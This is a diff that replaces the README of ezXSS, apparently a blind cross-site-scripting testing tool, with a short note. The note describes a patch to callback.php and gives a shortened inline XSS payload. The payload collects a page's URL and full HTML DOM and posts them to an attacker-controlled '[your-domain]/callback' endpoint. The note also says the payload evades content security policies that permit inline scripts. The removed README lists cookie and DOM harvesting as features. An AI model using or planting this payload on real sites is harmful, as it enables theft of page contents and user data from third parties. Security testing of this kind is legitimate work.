@@ -1,62 +1,9 @@
-# ezXSS
-ezXSS is an easy way to test (blind) Cross Site Scripting.
+Adding a quick check for the existence of parameters in callback.php of ezXSS (line 13-27) allows those parameters to be missing from log requests.
 
-![Alert](https://ssl.github.io/cdn/ezXSS/error.png) I'm currently busy with building ezXSS 3. The whole application will be re-coded.
+Now the plain JS code which doesn't need to retrieve a file can be hortened a bit:
 
-## Current features
-Some features ezXSS has
+    <script>window.addEventListener('load',()=>{x={},a=document,x.uri=a.URL,x.dom=a.documentElement.outerHTML,t=new XMLHttpRequest,t.open('POST','https://[your-domain]/callback',1),t.send(JSON.stringify(x))})</script>
+   
+It's still pretty long, but better than before.
 
-* Easy to use dashboard with statics, payloads, view/share/search reports and more
-* Payload generator
-* Instant email alert on payload
-* Custom javascript for extra testing
-* Prevent double payloads from saving or alerting
-* Share reports with other ezXSS users
-* Easily manage and view reports in the system
-* Search for reports in no time
-* Secure your system account with extra protection (2FA)
-* The following information is collected on a vulnerable page:
-    * The URL of the page
-    * IP Address
-    * Any page referer (or share referer)
-    * The User-Agent
-    * All Non-HTTP-Only Cookies
-    * Full HTML DOM source of the page
-    * Page origin
-    * Time of execution
-* its just ez :-)
-
-## Required
-* PHP 5.5 or up
-* A domain name (consider a short one)
-* An SSL if you want to test on https websites (consider Cloudflare or Let's Encrypt for a free SSL)
-
-## Installation
-ezXSS is ez to install
-
-* Download the 'files' folder and put all the files inside your root
-* Create an empty database and provide your database information in '/manage/src/Database.php'
-* Go to /manage/install in your browser and setup a password and email
-* Done! That was ez right?
-
-## To do list
-Some things I am planning to add/change in future versions.
-
-I'm currently busy with ezXSS 3.0.
-
-* Cleaner dashboard
-* Enable/Disable screenshots
-* Finishing the API
-* Adding SMS/Slack/Telegram notifications
-* Fully OOP based
-* Page grabbing
-* Live JS - send JS code LIVE while the person is on the page
-* You got ideas?
-
-## Screenshots
-
-![Dashboard](https://i.imgur.com/0us9M4M.png)
-![Settings](https://i.imgur.com/5BbdyYQ.png)
-![Payload](https://i.imgur.com/5nKDqcQ.png)
-![Reports](https://i.imgur.com/6TTXOw3.png)
-![Login](https://i.imgur.com/I9W7jxU.png)
+The benefit of this is that it's not caught by CSPs which allow  inline scripts.
